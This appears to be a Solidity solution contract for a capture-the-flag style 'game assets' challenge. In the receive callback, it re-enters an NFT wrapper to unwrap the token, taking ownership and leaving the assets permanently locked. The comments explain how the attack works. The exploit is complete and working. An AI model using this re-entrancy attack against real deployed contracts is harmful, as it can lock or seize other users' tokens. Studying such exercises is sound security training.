pragma solidity ^0.8.0;

import "../game-assets/GameAsset.sol";
import "../game-assets/AssetWrapper.sol";
import "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

contract SolveGameAssets {
  AssetWrapper wrapper; 
  address currentNFTcall;

  constructor(AssetWrapper _wrapper) {
    wrapper = _wrapper;
  }

  function solve(uint256 nftid, address[] memory nftAddresses) external {
    for (uint256 i; i < nftAddresses.length; ++i) {
      currentNFTcall = nftAddresses[i];
      wrapper.wrap(nftid, address(this), nftAddresses[i]);
    }
  }

// Callback happens before all checks are completed meaning that we can 
// Unwrap the token just given to us through re-entrancy which will then 
// proceed to give us the ownership of the token since the contract has been
// set as the operator.

// Then since we have already unwrapped our token before the ownership changed
// there is no way for the assets to unlock.
  function onERC1155Received(
        address,
        address,
        uint256,
        uint256,
        bytes calldata
  ) external returns(bytes4) {

    wrapper.unwrap(address(this), currentNFTcall);
    return hex"f23a6e61";
  }
}